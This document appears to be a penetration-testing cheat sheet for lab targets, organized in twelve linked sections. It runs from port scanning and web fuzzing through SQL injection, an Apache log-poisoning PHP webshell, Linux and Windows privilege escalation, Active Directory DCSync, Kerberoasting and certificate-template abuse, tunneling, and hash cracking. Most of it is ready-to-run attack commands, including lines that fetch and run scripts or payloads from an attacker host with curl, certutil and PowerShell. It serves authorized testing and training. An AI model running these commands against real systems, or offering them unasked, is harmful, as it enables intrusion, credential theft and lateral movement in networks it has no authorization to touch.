# 01. Network Discovery & Port Scanning Guide

> [!NOTE]
> Network reconnaissance is the foundational phase of any assessment. Fast port discovery combined with targeted script scans provides the attack surface blueprint.

## 1. TCP Port Scanning Workflows

### Initial Fast Scan
Scan the top 1000 TCP ports with version detection and default safe scripts:
```bash
nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt {TARGET_IP}
```

### Full Exhaustive Scan
Scan all 65,535 TCP ports to discover non-standard services:
```bash
nmap -p- -sC -sV -Pn --min-rate 3000 -oA nmap_full {TARGET_IP}
```

### Turbo RustScan
Asynchronous port scanner that pipes directly into Nmap:
```bash
rustscan -a {TARGET_IP} -r 1-65535 --ulimit 5000 -- -sC -sV -oN rustscan.txt
```

## 2. UDP Service Discovery
Identify critical UDP services like SNMP, TFTP, DNS, and NTP:
```bash
sudo nmap -sU --top-ports 20 -Pn --open -oN nmap_udp.txt {TARGET_IP}
```

## 3. Supplementary Enumeration
- **SNMP Community String**: `snmpwalk -v 2c -c public {TARGET_IP}`
- **SMB Guest Shares**: `smbmap -H {TARGET_IP} -u "" -p ""`

> [!TIP]
> Always verify exposed web ports and transition to [[02. Web Content Discovery & Directory Fuzzing]] or pivot via [[09. Pivoting, Tunnels & Lateral Movement]].

# 02. Web Content Discovery & Directory Fuzzing

> [!NOTE]
> Web applications represent the largest initial foothold vector. Fuzzing endpoints and virtual host headers uncovers unindexed administration portals and legacy scripts.

## 1. Directory & File Fuzzing with ffuf
High-speed discovery with automatic calibration and extension recursion:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://{TARGET_IP}/FUZZ -e .php,.html,.txt,.bak -ac -mc 200,301,302,403
```

## 2. Virtual Host (VHost) Fuzzing
Discover hidden subdomains routing on the same IP:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_IP} -H "Host: FUZZ.target.htb" -mc 200,301,302 -fs 1234
```

## 3. Recursive Crawling with Feroxbuster
Recursively traverse directories to depth 2:
```bash
feroxbuster -u http://{TARGET_IP}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,asp,aspx,jsp -d 2
```

## 4. WordPress CMS Audit
```bash
wpscan --url http://{TARGET_IP}/ --enumerate ap,at,u,cb --plugins-detection aggressive
```

> [!TIP]
> After identifying vulnerable parameters, proceed to [[03. Web Application Exploitation & Injection]].

# 03. Web Application Exploitation & Injection

> [!IMPORTANT]
> Always verify database technology and backend language before launching automated tools to prevent denial-of-service.

## 1. Automated SQL Injection with SQLmap
Extract databases using risk and level heuristics:
```bash
sqlmap -u "http://{TARGET_IP}/item.php?id=1" --batch --random-agent --level=3 --risk=2 --dbs
```
Target saved HTTP request from Burp Suite:
```bash
sqlmap -r request.txt -p username --batch --current-db --dump
```

## 2. Local File Inclusion (LFI) & Log Poisoning
Read source code via PHP wrapper:
```text
http://{TARGET_IP}/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
Poison Apache access log via User-Agent header:
```bash
curl -s -A "<?php system($_GET['cmd']); ?>" http://{TARGET_IP}/
curl "http://{TARGET_IP}/index.php?page=/var/log/apache2/access.log&cmd=id"
```

## 3. GraphQL Introspection
Dump all schema types and query fields:
```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name}}}}"}' http://{TARGET_IP}/graphql | jq .
```

> [!TIP]
> Once a reverse shell is obtained, stabilize your terminal immediately using [[12. Interactive TTY Stabilization & Terminal Spawning]] before escalating privileges via [[04. Linux Privilege Escalation Master Guide]].

# 04. Linux Privilege Escalation Master Guide

> [!NOTE]
> Privilege escalation on Linux relies on identifying misconfigured permissions, SUID binaries, custom root cronjobs, or kernel vulnerabilities.

## 1. SUID Binaries & Capabilities
Find all files with SUID bit set:
```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```
Audit binary capabilities:
```bash
getcap -r / 2>/dev/null
```

## 2. Sudo Privileges & GTFOBins
Check current user permissions:
```bash
sudo -l
```

## 3. Automated Enumeration
Pipe LinPEAS directly into bash memory:
```bash
curl -L http://{LHOST}:8000/linpeas.sh | sh
```
Sniff transient cronjobs with pspy without root privileges:
```bash
./pspy64 -pf -i 1000
```

## 4. Tar Wildcard Injection Exploit
If a root cronjob runs `tar -czf backup.tar.gz *`:
```bash
touch /var/backup/--checkpoint=1
touch "/var/backup/--checkpoint-action=exec=sh root.sh"
```

## 5. Docker Container Escape
Mount the host root filesystem from inside Docker:
```bash
docker run -v /:/host -it alpine chroot /host /bin/bash
```

> [!TIP]
> Check extracted hashes against [[10. Password Cracking & Hash Identification]].

# 05. Windows Local Privilege Escalation & LOLBAS

> [!NOTE]
> On Windows, service accounts frequently hold privileges like `SeImpersonatePrivilege` that permit direct escalation to `NT AUTHORITY\SYSTEM`.

## 1. Token Impersonation Exploits
If `whoami /priv` reveals `SeImpersonatePrivilege`:
- **GodPotato** (Windows Server 2012-2022):
  ```cmd
  GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
  ```
- **PrintSpoofer** (Named pipe print spooler impersonation):
  ```cmd
  PrintSpoofer64.exe -i -c cmd
  ```

## 2. AlwaysInstallElevated Registry Keys
Check if MSI installers run with elevated permissions:
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## 3. Unquoted Service Paths
Detect unquoted service binary paths containing spaces:
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

> [!TIP]
> Stage binaries using [[11. Offensive File Transfers Across Restricted Networks]], then pivot toward domain control via [[06. Active Directory Attack Paths & Domain Enumeration]].

# 06. Active Directory Attack Paths & Domain Enumeration

> [!IMPORTANT]
> Active Directory environments rely on complex trust relationships, ACL permissions, and Kerberos delegation.

## 1. BloodHound / SharpHound Telemetry
Collect all domain objects, groups, sessions, and ACLs:
```cmd
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename htb_ad.zip
```

## 2. NetExec (CrackMapExec) Domain Sweep
Verify credentials and locate administrative access across subnets:
```bash
nxc smb {TARGET_IP} -u {USER} -p "{PASSWORD}" --shares
```

## 3. Remote PowerShell with Evil-WinRM
```bash
evil-winrm -i {TARGET_IP} -u {USER} -p "{PASSWORD}" -s /opt/scripts
```

## 4. DCSync Credential Extraction
Dump all NTLM password hashes directly over RPC:
```bash
impacket-secretsdump {DOMAIN}/{USER}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm
```

> [!TIP]
> Combine domain enumeration with [[07. Kerberos Exploitation: AS-REP & Kerberoasting]] and [[08. Active Directory Certificate Services (AD CS) Abuse]].

# 07. Kerberos Exploitation: AS-REP & Kerberoasting

> [!NOTE]
> Kerberos attacks allow attackers to extract encrypted password hashes from Domain Controllers without triggering account lockouts.

## 1. AS-REP Roasting (No Pre-Authentication)
Target users that have `DONT_REQ_PREAUTH` enabled:
```bash
impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {TARGET_IP} -format hashcat -outputfile asreproast.hashes
```
Crack with Hashcat Mode 18200:
```bash
hashcat -m 18200 asreproast.hashes /usr/share/wordlists/rockyou.txt -O
```

## 2. Kerberoasting (Service Principal Names)
Request TGS tickets for accounts configured with an SPN:
```bash
impacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -dc-ip {TARGET_IP} -request -outputfile hashes.kerberoast
```
Crack with Hashcat Mode 13100:
```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -O
```

> [!TIP]
> Reference Hashcat mode numbers in [[10. Password Cracking & Hash Identification]].

# 08. Active Directory Certificate Services (AD CS) Abuse

> [!IMPORTANT]
> AD CS provides PKI capabilities for Active Directory. Misconfigured certificate templates grant low-privileged users the ability to impersonate Domain Administrators.

## 1. Vulnerability Discovery
Scan the domain for vulnerable certificate templates:
```bash
certipy find -u {USER}@{DOMAIN} -p "{PASSWORD}" -dc-ip {TARGET_IP} -vulnerable -stdout
```

## 2. ESC1 Abuse (Enrollee Supplies Subject / Client Auth)
Request a certificate for `Administrator`:
```bash
certipy req -u {USER}@{DOMAIN} -p "{PASSWORD}" -dc-ip {TARGET_IP} -ca {CA_NAME} -template ESC1_Template -upn Administrator@{DOMAIN}
```

## 3. Authenticate & Obtain NT Hash
Authenticate with the generated PFX certificate to extract the Administrator's NT hash:
```bash
certipy auth -pfx administrator.pfx -dc-ip {TARGET_IP}
```

> [!TIP]
> Use the acquired NT hash for Pass-The-Hash execution via [[06. Active Directory Attack Paths & Domain Enumeration]].

# 09. Pivoting, Tunnels & Lateral Movement

> [!NOTE]
> In multi-tiered networks, compromised dual-homed hosts act as pivot jumpboxes into isolated internal subnets.

## 1. Chisel Reverse SOCKS Tunnel
- **Attacker Server**:
  ```bash
  ./chisel server -p 8000 --reverse
  ```
- **Victim Client**:
  ```bash
  ./chisel client {LHOST}:8000 R:socks
  ```

## 2. SSH Port Forwarding
- **Dynamic SOCKS5 Proxy (-D)**:
  ```bash
  ssh -D 1080 -f -C -q -N {USER}@{TARGET_IP}
  ```
- **Local Port Forward (-L)**:
  ```bash
  ssh -L 9999:127.0.0.1:8443 {USER}@{TARGET_IP} -N
  ```
- **Remote Port Forward (-R)**:
  ```bash
  ssh -R {LPORT}:127.0.0.1:80 {USER}@{LHOST} -N
  ```

## 3. Proxychains Scanning
Route tools through configured SOCKS5 proxy:
```bash
proxychains4 -q nmap -sT -Pn -p 21,22,80,445,3389 172.16.1.10
```

> [!TIP]
> Stage tunnel binaries using [[11. Offensive File Transfers Across Restricted Networks]].

# 10. Password Cracking & Hash Identification

> [!NOTE]
> High-performance GPU cracking with Hashcat recovers plaintext credentials from dumped password hashes.

## 1. Hashcat Essential Modes Reference
| Mode (`-m`) | Hash Format | Typical Source |
|---|---|---|
| `1000` | NTLM | Windows SAM / NTDS.dit |
| `1800` | SHA512crypt (`$6$`) | Linux `/etc/shadow` |
| `13100` | Kerberos 5 TGS | Active Directory Kerberoasting |
| `18200` | Kerberos 5 AS-REP | Active Directory AS-REP Roasting |
| `3200` | bcrypt (`$2y$`, `$2a$`) | Modern Web Databases |
| `16500` | JWT (JSON Web Token) | Web API Tokens |

## 2. Command Examples
- **Crack NTLM**:
  ```bash
  hashcat -m 1000 ntlm.hashes /usr/share/wordlists/rockyou.txt -O
  ```
- **Crack Kerberoast**:
  ```bash
  hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -O
  ```

> [!TIP]
> Use cracked administrative credentials for lateral movement in [[06. Active Directory Attack Paths & Domain Enumeration]].

# 11. Offensive File Transfers Across Restricted Networks

> [!NOTE]
> Dropping binaries on target hosts requires resilient stagers that bypass antivirus and network inspection.

## 1. Hosting Files on Attacker
```bash
python3 -m http.server 8000
sudo impacket-smbserver share $(pwd) -smb2support
```

## 2. Windows Downloads
- **PowerShell WebClient**:
  ```powershell
  powershell -c "Invoke-WebRequest -Uri http://{LHOST}:8000/shell.exe -OutFile C:\Windows\Temp\shell.exe"
  ```
- **Certutil (Built-in LOLBAS)**:
  ```cmd
  certutil -urlcache -split -f http://{LHOST}:8000/payload.exe C:\Temp\payload.exe
  ```

## 3. Base64 Pipe (Zero Network Transfers)
- **Encode on Attacker**:
  ```bash
  cat binary.exe | base64 -w 0
  ```
- **Decode in PowerShell**:
  ```powershell
  [IO.File]::WriteAllBytes("C:\Temp\tool.exe", [Convert]::FromBase64String("BASE64_STRING"))
  ```

> [!TIP]
> Downloaded tools enable privilege escalation in [[04. Linux Privilege Escalation Master Guide]] and [[05. Windows Local Privilege Escalation & LOLBAS]].

# 12. Interactive TTY Stabilization & Terminal Spawning

> [!IMPORTANT]
> Raw reverse shells lack arrow key navigation, tab autocompletion, job control (`Ctrl+C`), and editor support. Stabilizing the shell is crucial before running interactive commands like `sudo` or `su`.

## 1. The Standard Python + stty Technique
1. **Spawn pseudo-terminal in remote shell**:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
2. **Background the shell**:
   Press `Ctrl+Z`.
3. **Configure local terminal and bring shell to foreground**:
   ```bash
   stty raw -echo; fg
   ```
4. **Export terminal environment and window dimensions**:
   ```bash
   export TERM=xterm-256color
   stty rows 38 columns 140
   ```

## 2. Alternative: Using `script`
If Python is not installed on the victim:
```bash
script -qc /bin/bash /dev/null
# Then Ctrl+Z -> stty raw -echo; fg
```

> [!TIP]
> After establishing a stable interactive TTY, proceed with [[04. Linux Privilege Escalation Master Guide]].
